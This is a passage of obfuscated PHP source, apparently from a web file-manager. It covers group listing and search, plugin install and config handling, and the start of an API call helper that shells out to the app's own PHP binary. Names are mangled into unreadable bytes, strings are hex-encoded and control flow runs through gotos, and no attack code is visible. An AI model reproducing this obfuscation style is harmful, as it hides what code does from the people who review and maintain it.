"{$e™ó—’ÃáÍ}\40{$eİéÂ‰ô¬}\x2c\x20\147\x72\x6f\165\x70\111\x44\40\x61\163\x63"; return $this->order($b·Ïâ›«±ñ); goto B™–ôÊ×‚õ; A”ÍŠËÛˆ¶: $cë®„‡‡Š =& $_SERVER[¼]; $A±ù®„ƒ„Å = array($cë®„‡‡Š[2067], $cë®„‡‡Š[28], $cë®„‡‡Š[2053], $cë®„‡‡Š[184]); $DÂ£º¤İ½ = array($cë®„‡‡Š[398] => $cë®„‡‡Š[399], $cë®„‡‡Š[400] => $cë®„‡‡Š[401]); goto e¨Õ¶˜Í; B™–ôÊ×‚õ: } public function listChild($EÜ«Ò…²ŒÈ) { $a‰¯‰¨§ =& $_SERVER[¼]; $CŞù³”Ì = $this->where(array($a‰¯‰¨§[457] => $EÜ«Ò…²ŒÈ))->_makeOrder()->selectPage(200); $this->_listDataApply($CŞù³”Ì[$a‰¯‰¨§[351]]); return $CŞù³”Ì; } public function listByID($E¡îêÔ²ç¤) { $FÃØ‰¥¬Ã =& $_SERVER[¼]; if (!$E¡îêÔ²ç¤) { return array(); } $FÊ åÑ¨„ = array($FÃØ‰¥¬Ã[2067] => array($FÃØ‰¥¬Ã[7], $E¡îêÔ²ç¤)); $bĞ­ŞÚµÑ† = $this->where($FÊ åÑ¨„)->select(); $this->_listDataApply($bĞ­ŞÚµÑ†); return $bĞ­ŞÚµÑ†; } public function listSearch($a‰ ‚ì…) { goto açÑáçĞ¯¼; B¹ƒÄµ‰ó : if (!trim($eä›Ş±ÛÎ)) { return !1; } $eä›Ş±ÛÎ = str_replace($CŸÁ½™»–µ[2145], $CŸÁ½™»–µ[2146], $eä›Ş±ÛÎ); $Dáµà—½Ğ˜ = array($CŸÁ½™»–µ[2067] => array($CŸÁ½™»–µ[743], "\x25{$eä›Ş±ÛÎ}\x25"), $CŸÁ½™»–µ[28] => array($CŸÁ½™»–µ[743], "\45{$eä›Ş±ÛÎ}\x25"), $CŸÁ½™»–µ[909] => $CŸÁ½™»–µ[2147]); goto D‰î‰‡¸’É; açÑáçĞ¯¼: $CŸÁ½™»–µ =& $_SERVER[¼]; $eä›Ş±ÛÎ = $a‰ ‚ì…[$CŸÁ½™»–µ[2143]]; $Dã¬š®ÈƒÄ = isset($a‰ ‚ì…[$CŸÁ½™»–µ[2144]]) ? $a‰ ‚ì…[$CŸÁ½™»–µ[2144]] : !1; goto B¹ƒÄµ‰ó ; D‰î‰‡¸’É: $f©ççˆÀ³ = $this->_makeOrder()->where($Dáµà—½Ğ˜)->selectPage(20); $f©ççˆÀ³ = $f©ççˆÀ³ ? $f©ççˆÀ³ : array(); if (!$f©ççˆÀ³ || count($f©ççˆÀ³[$CŸÁ½™»–µ[351]]) < 5 && Input::check($eä›Ş±ÛÎ, $CŸÁ½™»–µ[303])) { $AÇğ®ØíÑª = $this->_searchFromMeta($CŸÁ½™»–µ[411], $eä›Ş±ÛÎ, 10); $Eß“î»Õ²Ÿ = $this->_searchFromMeta($CŸÁ½™»–µ[412], $eä›Ş±ÛÎ, 10); $eŒ»‹½Æª = array_merge($AÇğ®ØíÑª, $Eß“î»Õ²Ÿ, $f©ççˆÀ³[$CŸÁ½™»–µ[351]]); $f©ççˆÀ³[$CŸÁ½™»–µ[351]] = array_unique_by_key($eŒ»‹½Æª, $CŸÁ½™»–µ[2067]); $f©ççˆÀ³[$CŸÁ½™»–µ[348]][$CŸÁ½™»–µ[349]] = count($f©ççˆÀ³[$CŸÁ½™»–µ[351]]); $f©ççˆÀ³[$CŸÁ½™»–µ[348]][$CŸÁ½™»–µ[350]] = ceil($f©ççˆÀ³[$CŸÁ½™»–µ[348]][$CŸÁ½™»–µ[349]] / $f©ççˆÀ³[$CŸÁ½™»–µ[348]][$CŸÁ½™»–µ[346]]); } goto DÛßê†ÑÒ ; DÛßê†ÑÒ : $this->_listDataApply($f©ççˆÀ³[$CŸÁ½™»–µ[351]]); return $f©ççˆÀ³; goto eÁ»…ì§Åî; eÁ»…ì§Åî: } private function _searchFromMeta($D–‰†¤£‚, $E»Ôˆ£‰Ëõ, $DÒÜ¹‹ŞÃ) { goto Fİİ˜Ùô»; C²ˆÌ÷äÜ¶: $c·µãòó‰ƒ = Model($EèŞ‡ó½ß[2148])->where($d†ŒÎæ‰›Ö)->limit($DÒÜ¹‹ŞÃ)->select(); if (!$c·µãòó‰ƒ) { return array(); } $c·µãòó‰ƒ = array_to_keyvalue($c·µãòó‰ƒ, $EèŞ‡ó½ß[33], $EèŞ‡ó½ß[2067]); goto BÆ‰´İ™¦õ; BÆ‰´İ™¦õ: $bğª»Óµ§ = $this->where(array($EèŞ‡ó½ß[2139] => array($EèŞ‡ó½ß[7], $c·µãòó‰ƒ)))->select(); if (!$bğª»Óµ§) { return array(); } return $bğª»Óµ§; goto bŒ×ÂÁ¨èê; Fİİ˜Ùô»: $EèŞ‡ó½ß =& $_SERVER[¼]; $E»Ôˆ£‰Ëõ = strtolower($E»Ôˆ£‰Ëõ); $d†ŒÎæ‰›Ö = array($EèŞ‡ó½ß[89] => $D–‰†¤£‚, $EèŞ‡ó½ß[356] => array($EèŞ‡ó½ß[743], "\45{$E»Ôˆ£‰Ëõ}\45")); goto C²ˆÌ÷äÜ¶; bŒ×ÂÁ¨èê: } protected function _listDataApplyItem($DÅÃ²¬Ø…ä) { $D»Ÿ„ÌÒ…¦ = array($DÅÃ²¬Ø…ä); $this->_listDataApply($D»Ÿ„ÌÒ…¦); return $D»Ÿ„ÌÒ…¦[0]; } protected function _listDataApply(&$bÈ„Î„éƒÁ) { goto d´…×ÏË¿; dè ‘¶§Ë—: $this->_listAppendParent($bÈ„Î„éƒÁ); $this->_listAppendSourceRoot($bÈ„Î„éƒÁ, $Böáçìò¢ù); goto FŸƒ¹öèØ½; d´…×ÏË¿: $FÂ’ïÜ¢Ğ¨ =& $_SERVER[¼]; if (!$bÈ„Î„éƒÁ) { return; } $Böáçìò¢ù = array_to_keyvalue($bÈ„Î„éƒÁ, $FÂ’ïÜ¢Ğ¨[33], $FÂ’ïÜ¢Ğ¨[2067]); goto a©†ùâè·; a©†ùâè·: $this->_listAppendChildren($bÈ„Î„éƒÁ); $this->_listAppendChildrenMember($bÈ„Î„éƒÁ); $this->_listAppendMeta($bÈ„Î„éƒÁ, $Böáçìò¢ù); goto dè ‘¶§Ë—; FŸƒ¹öèØ½: } private function _listAppendChildren(&$CÉ¦·İğÁÃ) { goto CÎÁ‘‡¡Şà; CÎÁ‘‡¡Şà: $eó¯…¨¨Ó =& $_SERVER[¼]; $aé‹‚‰è¤ = $eó¯…¨¨Ó[358]; $Eä‚ä®è±Ü = array(); goto fÊØô¢İ”É; fÊØô¢İ”É: $cŸó©¦î¢» = count($CÉ¦·İğÁÃ); $FéÜ­¿„šµ = $this->tablePrefix . $this->tableName; for ($dù«ÂŒ”¶í = 0, $Fˆ½Û¦—’ = 0; $dù«ÂŒ”¶í < $cŸó©¦î¢»; $dù«ÂŒ”¶í++) { $Fˆ½Û¦—’++; $aíÇ¦ê¢ˆ­ = $CÉ¦·İğÁÃ[$dù«ÂŒ”¶í][$eó¯…¨¨Ó[2067]]; $aé‹‚‰è¤ .= "\x53\x45\x4c\105\103\x54\x20\x2a\x20\106\x52\x4f\115\x20\x28\123\x45\x4c\x45\x43\124\x20\x27{$aíÇ¦ê¢ˆ­}\x5f\x63\x68\x69\154\144\x27\40\x61\x73\40\150\x61\x73\x20\x46\122\x4f\115\x20\x60{$FéÜ­¿„šµ}\140\40\x77\x68\x65\162\x65\40\x70\141\x72\x65\156\164\111\104\75{$aíÇ¦ê¢ˆ­}\40\154\151\x6d\x69\x74\x20\61\x29\x20\141\x73\x20\x74\142\137{$aíÇ¦ê¢ˆ­}\40\x75\156\x69\157\156\40\141\154\x6c\x20"; if (($Fˆ½Û¦—’ >= 20 || $dù«ÂŒ”¶í == $cŸó©¦î¢» - 1) && $aé‹‚‰è¤) { $aé‹‚‰è¤ = substr($aé‹‚‰è¤, 0, -strlen($eó¯…¨¨Ó[445])); $FŞÂè¡ó„ñ = $this->query($aé‹‚‰è¤); $Eä‚ä®è±Ü = array_merge($Eä‚ä®è±Ü, $FŞÂè¡ó„ñ); $Fˆ½Û¦—’ = 0; $aé‹‚‰è¤ = $eó¯…¨¨Ó[33]; } } goto FØš„ñ•±Ê; FØš„ñ•±Ê: $Eä‚ä®è±Ü = array_to_keyvalue($Eä‚ä®è±Ü, $eó¯…¨¨Ó[446]); foreach ($CÉ¦·İğÁÃ as &$Aàù’™Ç±) { $Aàù’™Ç±[$eó¯…¨¨Ó[2149]] = isset($Eä‚ä®è±Ü[$Aàù’™Ç±[$eó¯…¨¨Ó[2067]] . $eó¯…¨¨Ó[2150]]); } goto A˜ÀÇàÅñ; A˜ÀÇàÅñ: } private function _listAppendChildrenMember(&$B°Š‰Ö¨Ì) { goto b¶©ÑøË¼µ; b¶©ÑøË¼µ: $aÛ‡Ç´¬Æ =& $_SERVER[¼]; $c„øÀ¼Ìç = $aÛ‡Ç´¬Æ[358]; $eÈĞ¸“ó ¾ = array(); goto céİĞÑãÁ·; céİĞÑãÁ·: $CïÁ£æ¾×” = count($B°Š‰Ö¨Ì); $a©›Èİ©ší = $this->tablePrefix . $aÛ‡Ç´¬Æ[2141]; for ($b¶®•ì¸™¯ = 0, $cŸÛ¥ÙÄÃ¶ = 0; $b¶®•ì¸™¯ < $CïÁ£æ¾×”; $b¶®•ì¸™¯++) { $cŸÛ¥ÙÄÃ¶++; $B©ø†È¸ö÷ = $B°Š‰Ö¨Ì[$b¶®•ì¸™¯][$aÛ‡Ç´¬Æ[2067]]; $c„øÀ¼Ìç .= "\x53\x45\114\105\103\x54\x20\52\x20\106\122\117\115\x20\x28\x53\105\x4c\x45\x43\124\x20\x27{$B©ø†È¸ö÷}\x5f\143\150\x69\x6c\144\47\x20\x61\163\40\150\x61\163\x20\106\122\x4f\x4d\x20\140{$a©›Èİ©ší}\140\40\x77\150\x65\162\x65\40\x67\162\x6f\165\x70\111\x44\x3d{$B©ø†È¸ö÷}\40\154\151\x6d\x69\164\40\x31\x29\40\141\163\40\x74\x62\137{$B©ø†È¸ö÷}\x20\165\x6e\151\x6f\x6e\40\141\154\x6c\40"; if (($cŸÛ¥ÙÄÃ¶ >= 20 || $b¶®•ì¸™¯ == $CïÁ£æ¾×” - 1) && $c„øÀ¼Ìç) { $c„øÀ¼Ìç = substr($c„øÀ¼Ìç, 0, -strlen($aÛ‡Ç´¬Æ[445])); $F±ŠÊ“•Ï = $this->query($c„øÀ¼Ìç); $eÈĞ¸“ó ¾ = array_merge($eÈĞ¸“ó ¾, $F±ŠÊ“•Ï); $cŸÛ¥ÙÄÃ¶ = 0; $c„øÀ¼Ìç = $aÛ‡Ç´¬Æ[33]; } } goto EïªÌåİºĞ; EïªÌåİºĞ: $eÈĞ¸“ó ¾ = array_to_keyvalue($eÈĞ¸“ó ¾, $aÛ‡Ç´¬Æ[446]); foreach ($B°Š‰Ö¨Ì as &$cº™Ì¦œóâ) { $cº™Ì¦œóâ[$aÛ‡Ç´¬Æ[2151]] = isset($eÈĞ¸“ó ¾[$cº™Ì¦œóâ[$aÛ‡Ç´¬Æ[2067]] . $aÛ‡Ç´¬Æ[2150]]); } goto E˜¤±è÷È; E˜¤±è÷È: } private function _listAppendMeta(&$bñ²óé³‹¬, $c´¥· Ş‡™) { $A¹’šÉªŒá =& $_SERVER[¼]; $fÑ“¸‹ˆµ¤ = array($A¹’šÉªŒá[2067] => array($A¹’šÉªŒá[7], $c´¥· Ş‡™)); $aÃ’ÄàË” = Model($A¹’šÉªŒá[2140])->where($fÑ“¸‹ˆµ¤)->select(); $aÃ’ÄàË” = array_to_keyvalue_group($aÃ’ÄàË”, $A¹’šÉªŒá[2067]); foreach ($aÃ’ÄàË” as &$D˜Æ¤¥Úò) { $D˜Æ¤¥Úò = array_to_keyvalue($D˜Æ¤¥Úò, $A¹’šÉªŒá[89], $A¹’šÉªŒá[356]); } foreach ($bñ²óé³‹¬ as &$d§ºù”®¢˜) { $d§ºù”®¢˜[$A¹’šÉªŒá[413]] = array(); if (isset($aÃ’ÄàË”[$d§ºù”®¢˜[$A¹’šÉªŒá[2067]]])) { $d§ºù”®¢˜[$A¹’šÉªŒá[413]] = $aÃ’ÄàË”[$d§ºù”®¢˜[$A¹’šÉªŒá[2067]]]; } } } protected function parentLevelArray($cˆš¦‘‹Ä‰) { $CÈì³¾§à÷ =& $_SERVER[¼]; $cˆš¦‘‹Ä‰ = explode($CÈì³¾§à÷[47], trim($cˆš¦‘‹Ä‰, $CÈì³¾§à÷[47])); $cˆš¦‘‹Ä‰ = array_remove_value($cˆš¦‘‹Ä‰, $CÈì³¾§à÷[464]); return $cˆš¦‘‹Ä‰; } private function _listAppendParent(&$DÒ‡Î›ÅÚë) { goto AçôËò…‹ù; BñŠäî“¾: foreach ($DÒ‡Î›ÅÚë as &$DÁŠµ¨¤’“) { $cÎÖáê = $this->parentLevelArray($DÁŠµ¨¤’“[$DæÍ„‚Ã›[455]]); $B»¾·ËÏ°è = $DæÍ„‚Ã›[33]; foreach ($cÎÖáê as $D®ä¸‡“) { $B»¾·ËÏ°è .= $D­ šŠá‹â[$D®ä¸‡“] . $DæÍ„‚Ã›[8]; } if ($cÎÖáê) { $B»¾·ËÏ°è .= $DÁŠµ¨¤’“[$DæÍ„‚Ã›[28]]; } $DÁŠµ¨¤’“[$DæÍ„‚Ã›[459]] = str_replace($DæÍ„‚Ã›[463], $DæÍ„‚Ã›[8], $B»¾·ËÏ°è); } goto a°£ÌÏŒë·; D •‘èÒ³±: $B²øŞ¸ê å = array(); foreach ($D­ šŠá‹â as $c£™ÎÃ„º› => $bŠ£ÓÒ‹™¬) { if (!$bŠ£ÓÒ‹™¬) { $B²øŞ¸ê å[] = $c£™ÎÃ„º›; } } if ($B²øŞ¸ê å) { $a·ºğİÚÊ = array($DæÍ„‚Ã›[2139] => array($DæÍ„‚Ã›[381], $B²øŞ¸ê å)); $fÊ­£ÎÜšˆ = $this->field($DæÍ„‚Ã›[2152])->where($a·ºğİÚÊ)->select(); $Bó„œ¶Î = array_to_keyvalue($fÊ­£ÎÜšˆ, $DæÍ„‚Ã›[2067], $DæÍ„‚Ã›[28]); $D­ šŠá‹â = array_merge_index($D­ šŠá‹â, $Bó„œ¶Î); } goto BñŠäî“¾; AçôËò…‹ù: $DæÍ„‚Ã› =& $_SERVER[¼]; $D­ šŠá‹â = array(); foreach ($DÒ‡Î›ÅÚë as &$DÁŠµ¨¤’“) { $D­ šŠá‹â[$DÁŠµ¨¤’“[$DæÍ„‚Ã›[2067]]] = $DÁŠµ¨¤’“[$DæÍ„‚Ã›[28]]; $cÎÖáê = $this->parentLevelArray($DÁŠµ¨¤’“[$DæÍ„‚Ã›[455]]); foreach ($cÎÖáê as $D®ä¸‡“) { if (!isset($D­ šŠá‹â[$D®ä¸‡“])) { $D­ šŠá‹â[$D®ä¸‡“] = 0; } } } goto D •‘èÒ³±; a°£ÌÏŒë·: } private function _listAppendSourceRoot(&$cÄ¥ŸÊÄ¾·, $EÇ¬±ñ»˜) { goto eâÆ„äçÈ·; CìçÃ¼¼’: foreach ($cÄ¥ŸÊÄ¾· as &$eÆñ®ö’¦×) { $eÆñ®ö’¦×[$B’¾Ôœ¯ñÀ[388]] = $E«¯‹Æ²ùâ[$eÆñ®ö’¦×[$B’¾Ôœ¯ñÀ[2067]]] ? $E«¯‹Æ²ùâ[$eÆñ®ö’¦×[$B’¾Ôœ¯ñÀ[2067]]] : array(); } goto E™ÇŸØî‰°; c‰†“æ¶‹: $E«¯‹Æ²ùâ = Model($B’¾Ôœ¯ñÀ[744])->order($B’¾Ôœ¯ñÀ[2154])->field($f„‰ñ¢é´)->where($FğàÕ’£Šä)->select(); $E«¯‹Æ²ùâ = array_to_keyvalue($E«¯‹Æ²ùâ, $B’¾Ôœ¯ñÀ[452]); $E«¯‹Æ²ùâ = array_remove_key($E«¯‹Æ²ùâ, $B’¾Ôœ¯ñÀ[452]); goto CìçÃ¼¼’; eâÆ„äçÈ·: $B’¾Ôœ¯ñÀ =& $_SERVER[¼]; $FğàÕ’£Šä = array($B’¾Ôœ¯ñÀ[368] => SourceModel::TYPE_GROUP, $B’¾Ôœ¯ñÀ[457] => 0, $B’¾Ôœ¯ñÀ[452] => array($B’¾Ôœ¯ñÀ[7], $EÇ¬±ñ»˜)); $f„‰ñ¢é´ = $B’¾Ôœ¯ñÀ[2153]; goto c‰†“æ¶‹; E™ÇŸØî‰°: } protected function resetParentLevel() { $A£‰Í©‰â‡ =& $_SERVER[¼]; $FöŞ‚°µÉ¶ = $A£‰Í©‰â‡[2067]; $b´ÌŠìÀ·§ = $this->select(); $b´ÌŠìÀ·§ = array_to_keyvalue($b´ÌŠìÀ·§, $FöŞ‚°µÉ¶); foreach ($b´ÌŠìÀ·§ as $C³Û™Ñôªª) { goto C¹·Æ­ŸŠî; eöÛ™Õó‰ß: $c†‰ùØŒù¨[] = 0; $c†‰ùØŒù¨ = $A£‰Í©‰â‡[47] . implode($A£‰Í©‰â‡[47], array_reverse($c†‰ùØŒù¨)) . $A£‰Í©‰â‡[47]; $this->setNamePinyin($C³Û™Ñôªª[$FöŞ‚°µÉ¶], $C³Û™Ñôªª[$A£‰Í©‰â‡[28]]); goto A¢»Ç´¥Öà; A¢»Ç´¥Öà: $this->where(array($FöŞ‚°µÉ¶ => $C³Û™Ñôªª[$FöŞ‚°µÉ¶]))->save(array($A£‰Í©‰â‡[521] => $c†‰ùØŒù¨)); goto F´œ±š°¡; C¹·Æ­ŸŠî: $FÃ×Ü¥’´ó = $C³Û™Ñôªª; $c†‰ùØŒù¨ = array(); while ($FÃ×Ü¥’´ó[$A£‰Í©‰â‡[457]] != 0) { $c†‰ùØŒù¨[] = $FÃ×Ü¥’´ó[$A£‰Í©‰â‡[457]]; $FÃ×Ü¥’´ó = $b´ÌŠìÀ·§[$FÃ×Ü¥’´ó[$A£‰Í©‰â‡[457]]]; } goto eöÛ™Õó‰ß; F´œ±š°¡: } return $b´ÌŠìÀ·§; } public function groupNameAuto($e†Ø‚íĞÆ, $cÄØ›²ó) { $bÍĞËÒÔã† =& $_SERVER[¼]; $Dè¢¹µ£¾™ = $this->where(array($bÍĞËÒÔã†[365] => $e†Ø‚íĞÆ))->getField($bÍĞËÒÔã†[28], !0); if (!$Dè¢¹µ£¾™ || !in_array($cÄØ›²ó, $Dè¢¹µ£¾™)) { return $cÄØ›²ó; } for ($cãÔïÙÂÛÅ = 1; $cãÔïÙÂÛÅ <= count($Dè¢¹µ£¾™) + 1; $cãÔïÙÂÛÅ++) { $EÙ–›°ğ„÷ = $cÄØ›²ó . "\50{$cãÔïÙÂÛÅ}\51"; if (!in_array($EÙ–›°ğ„÷, $Dè¢¹µ£¾™)) { return $EÙ–›°ğ„÷; } } } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\56\x70\x6c\165\x67\151\x6e\x4c\151\163\x74"; public $field = array("\156\141\x6d\x65", "\163\164\x61\164\x75\163", "\x72\x65\x67\x69\x65\163\164", "\x63\x6f\x6e\146\151\x67"); public function loadList($fóÅ¯Á‹Íì = false) { $BòÃ¬—Â = array_to_keyvalue($this->listData(), $_SERVER[¼][28]); if ($fóÅ¯Á‹Íì) { return $BòÃ¬—Â[$fóÅ¯Á‹Íì]; } return $BòÃ¬—Â; } public function init() { $E“Üï—ŞÁ„ =& $_SERVER[¼]; Hook::trigger($E“Üï—ŞÁ„[2155]); $c¦Âİ¬Å´ = $this->loadPluginList(); foreach ($c¦Âİ¬Å´ as $aó‡Ø±‹¬ => $E¢•‘õŒÊ…) { $añ‘¸’˜© = $this->appAllow($aó‡Ø±‹¬, $E¢•‘õŒÊ…); if (!$añ‘¸’˜©) { continue; } foreach ($E¢•‘õŒÊ…[$E“Üï—ŞÁ„[2156]] as $bÜËöËô´Œ => $fïŠ–º®î ) { Hook::bind($bÜËöËô´Œ, $fïŠ–º®î ); } } Hook::trigger($E“Üï—ŞÁ„[2157]); Hook::trigger(ACTION); } public function appAllow($FâÃ²â·ª, $AĞŒ±º…µ¯, $f„¤ç’ë”² = true) { $AĞ©À¤­Å‡ =& $_SERVER[¼]; $BÖ‚òÙÜØÛ = PLUGIN_DIR . $FâÃ²â·ª . $AĞ©À¤­Å‡[2158]; if (!is_array($AĞŒ±º…µ¯) || !is_array($AĞŒ±º…µ¯[$AĞ©À¤­Å‡[2156]]) || !is_file($BÖ‚òÙÜØÛ) || $AĞŒ±º…µ¯[$AĞ©À¤­Å‡[681]] != 1) { return !1; } if ($f„¤ç’ë”² && !Action($AĞ©À¤­Å‡[2159])->checkAuth($FâÃ²â·ª)) { return !1; } return !0; } public function unInstall($eÖİĞ”–©Æ) { $Bô’°½¨…Ü =& $_SERVER[¼]; $Eá¥·ŒÃ£Í = $this->loadList($eÖİĞ”–©Æ); if (file_exists(PLUGIN_DIR . $eÖİĞ”–©Æ)) { Hook::apply($eÖİĞ”–©Æ . $Bô’°½¨…Ü[2160]); } $this->remove($Eá¥·ŒÃ£Í[$Bô’°½¨…Ü[364]]); } public function changeStatus($EŞ³“ì¬Ü, $eÖœ¹ìİÈ) { $c…‡âË¥…ñ =& $_SERVER[¼]; $Cç¤ª„Ó±õ = $this->loadList($EŞ³“ì¬Ü); if ($eÖœ¹ìİÈ) { Hook::apply($EŞ³“ì¬Ü . $c…‡âË¥…ñ[2161]); } $this->update($Cç¤ª„Ó±õ[$c…‡âË¥…ñ[364]], array($c…‡âË¥…ñ[2162] => $eÖœ¹ìİÈ)); } public function appRegist($A÷‘¡‘äì, $dùÆÀÈ©Ñ˜) { $føÄÉíé± =& $_SERVER[¼]; $D®Ñ¤İ´šİ = $this->loadList($A÷‘¡‘äì); if ($D®Ñ¤İ´šİ) { $this->update($D®Ñ¤İ´šİ[$føÄÉíé±[364]], array($føÄÉíé±[2156] => $dùÆÀÈ©Ñ˜)); } else { $BİŒ†ŞÂ = array($føÄÉíé±[28] => $A÷‘¡‘äì, $føÄÉíé±[2156] => $dùÆÀÈ©Ñ˜, $føÄÉíé±[681] => 0, $føÄÉíé±[6] => $this->getConfigDefault($A÷‘¡‘äì)); $this->insert($BİŒ†ŞÂ); } } public function getConfigDefault($BÓÚÔİ°´) { $dššÜİƒè° =& $_SERVER[¼]; $f»Êùî¶È = array(); $eä¬Øãœ = $this->getPackageJson($BÓÚÔİ°´); if (!$eä¬Øãœ && is_array($eä¬Øãœ[$dššÜİƒè°[2163]])) { return $f»Êùî¶È; } foreach ($eä¬Øãœ[$dššÜİƒè°[2163]] as $a‘öØÚÖŠÆ => $cÚğ¦´öÆÆ) { if (!isset($cÚğ¦´öÆÆ[$dššÜİƒè°[356]]) || isset($f»Êùî¶È[$a‘öØÚÖŠÆ])) { continue; } $f»Êùî¶È[$a‘öØÚÖŠÆ] = $cÚğ¦´öÆÆ[$dššÜİƒè°[356]]; } return $f»Êùî¶È; } public function getPackageJson($eÏÍÁÆ˜) { return Hook::apply($eÏÍÁÆ˜ . $_SERVER[¼][2164]); } public function getConfig($Bì½êİ„, $e¥ìµÀô = false) { $FŞòªí§¬ë =& $_SERVER[¼]; $CŠÃÕøÚÒ’ = array(); $e§ŠŸ‹‰ß¦ = $this->loadList($Bì½êİ„); if ($e§ŠŸ‹‰ß¦ && is_array($e§ŠŸ‹‰ß¦[$FŞòªí§¬ë[6]])) { $CŠÃÕøÚÒ’ = $e§ŠŸ‹‰ß¦[$FŞòªí§¬ë[6]]; } if (!$CŠÃÕøÚÒ’ || $e¥ìµÀô) { $CŠÃÕøÚÒ’ = $this->getConfigDefault($Bì½êİ„); } return $CŠÃÕøÚÒ’; } public function setConfig($f—Í¢îñ¹ä, $f‡´å·£Ôä = false) { goto f¨êÎèó¢ø; AŠ¹¥Ü†èô: if ($f‡´å·£Ôä == !1) { $f‡´å·£Ôä = $this->getConfigDefault($f—Í¢îñ¹ä); } $c¿·›é’ğ’ = $câÎ‡ÓÄ‡[$cå­±¹›ÀÅ[6]]; foreach ($f‡´å·£Ôä as $Eâ‹ùà±ë => $AÌ‚±Š”±ô) { $c¿·›é’ğ’[$Eâ‹ùà±ë] = is_string($AÌ‚±Š”±ô) ? trim($AÌ‚±Š”±ô) : $AÌ‚±Š”±ô; } goto AÆ…¸ÆùÌÇ; f¨êÎèó¢ø: $cå­±¹›ÀÅ =& $_SERVER[¼]; $câÎ‡ÓÄ‡ = $this->loadList($f—Í¢îñ¹ä); if (!$câÎ‡ÓÄ‡) { return !1; } goto AŠ¹¥Ü†èô; AÆ…¸ÆùÌÇ: $this->update($câÎ‡ÓÄ‡[$cå­±¹›ÀÅ[364]], array($cå­±¹›ÀÅ[6] => $c¿·›é’ğ’)); goto bÛ­ªÊÚ‹•; bÛ­ªÊÚ‹•: } public function viewList() { goto ašˆæö‡­Ê; ašˆæö‡­Ê: $dóè˜•Éè =& $_SERVER[¼]; $BÃÁ©œ‰Ü = $this->loadList(); $this->pluginScan($BÃÁ©œ‰Ü); goto b½•¨‹¸ÈÂ; dáÇÌ‚Ê«¢: return $f¾ÚË£áæ¸; goto aïÂõ·Àô™; b½•¨‹¸ÈÂ: $BÃÁ©œ‰Ü = $this->loadPluginList(); $f¾ÚË£áæ¸ = array(); foreach ($BÃÁ©œ‰Ü as $F’õ’…´Ø– => $b†êÌ†Ö½…) { unset($b†êÌ†Ö½…[$dóè˜•Éè[2156]], $b†êÌ†Ö½…[$dóè˜•Éè[6]]); $cÎâŸ–…´ƒ = PLUGIN_DIR . $b†êÌ†Ö½…[$dóè˜•Éè[28]] . $dóè˜•Éè[2158]; if (!is_file($cÎâŸ–…´ƒ)) { continue; } $c¾½Ø¶º = Hook::apply($b†êÌ†Ö½…[$dóè˜•Éè[28]] . $dóè˜•Éè[2164]); if (is_array($c¾½Ø¶º)) { $f¾ÚË£áæ¸[$F’õ’…´Ø–] = array_merge($b†êÌ†Ö½…, $c¾½Ø¶º); } } goto dáÇÌ‚Ê«¢; aïÂõ·Àô™: } private function loadPluginList() { $cÎˆ’™æµ =& $_SERVER[¼]; $DäÑµæ—ï† = $this->loadList(); if (strtolower(MOD) == $cÎˆ’™æµ[2165]) { return $DäÑµæ—ï†; } $fÃÏ–µ•„¿ = Hook::trigger($cÎˆ’™æµ[2166], $DäÑµæ—ï†); if ($DäÑµæ—ï† && !$fÃÏ–µ•„¿) { die; } return $fÃÏ–µ•„¿ ? $fÃÏ–µ•„¿ : $DäÑµæ—ï†; } private function pluginScan($eÍÊ•µ±Ğ‰) { $DÆª”Â˜ÊÉ =& $_SERVER[¼]; recursion_dir(PLUGIN_DIR, $BÕœÙ†ÅãÌ, $eŒÊŒîáí, 0); foreach ($BÕœÙ†ÅãÌ as $aÉ¨²ŸõÍÙ) { $Dˆµëã†é¡ = get_path_this($aÉ¨²ŸõÍÙ); if (isset($eÍÊ•µ±Ğ‰[$Dˆµëã†é¡]) || !file_exists($aÉ¨²ŸõÍÙ . $DÆª”Â˜ÊÉ[2167]) || !file_exists($aÉ¨²ŸõÍÙ . $DÆª”Â˜ÊÉ[2158])) { continue; } Hook::apply($Dˆµëã†é¡ . $DÆª”Â˜ÊÉ[2161]); } } } goto fâ³§¥Í¸ö; a™¿§óá·: function ActionCall($C·óĞ£½œä) { $eç‘®çäĞ = array_slice(func_get_args(), 1); return ActionApply($C·óĞ£½œä, $eç‘®çäĞ); } function ActionCallApi($f¯öÙİ³ê, $B·íİ³ŒÅ = '') { goto D»¶ÊçÆºÏ; CöçõÂÚíå: $AêÊº•’„ = json_decode($bÑÑÉÓ¶», !0); $D—¶õ÷Õä¼ = is_array($AêÊº•’„) ? $AêÊº•’„ : array($bÎ —ï‰°[33] => null, $bÎ —ï‰°[34] => $bÑÑÉÓ¶»); if (!$AêÊº•’„) { echo $bÑÑÉÓ¶»; } goto CÓ¸Æ˜Ñ¬è; D»¶ÊçÆºÏ: $bÎ —ï‰° =& $_SERVER[À Ç]; $f†–…³ó¶ò = $B·íİ³ŒÅ; if (is_array($B·íİ³ŒÅ)) { $f†–…³ó¶ò = $bÎ —ï‰°[20]; foreach ($B·íİ³ŒÅ as $F“Ñ¬×Àæ› => $Bğ¥µ˜ö¤‹) { $Bğ¥µ˜ö¤‹ = is_array($Bğ¥µ˜ö¤‹) ? json_encode($Bğ¥µ˜ö¤‹) : $Bğ¥µ˜ö¤‹; $Bğ¥µ˜ö¤‹ = is_bool($Bğ¥µ˜ö¤‹) ? intval($Bğ¥µ˜ö¤‹) : $Bğ¥µ˜ö¤‹; $f†–…³ó¶ò .= $bÎ —ï‰°[21] . $F“Ñ¬×Àæ› . $bÎ —ï‰°[22] . rawurlencode($Bğ¥µ˜ö¤‹); } } goto EÆ «…É—; CÓ¸Æ˜Ñ¬è: return $D—¶õ÷Õä¼; goto a·³±«šë‹; A¤Ä«×²: $C’ÚÆÔÁ = phpBinCommand(); if ($C’ÚÆÔÁ && function_exists($bÎ —ï‰°[25])) { $EŞ‹Ñ¡íÇ = $C’ÚÆÔÁ . $bÎ —ï‰°[26] . BASIC_PATH . $bÎ —ï‰°[27] . escapeshellarg($f¯öÙİ³ê); $bÑÑÉÓ¶» = shell_exec($EŞ‹Ñ¡íÇ); } if (!$bÑÑÉÓ¶») { $dğ÷›Ê‚ÛÑ = stream_context_create(array($bÎ —ï‰°[28] => array($bÎ —ï‰°[29] => 20, $bÎ —ï‰°[30] => $bÎ —ï‰°[31]))); $bÑÑÉÓ¶» = file_get_contents(APP_HOST . $bÎ —ï‰°[32] . $f¯öÙİ³ê, !1, $dğ÷›Ê‚ÛÑ); } goto CöçõÂÚíå; EÆ «…É—: $c‹šƒÇ½ïœ = Action($bÎ 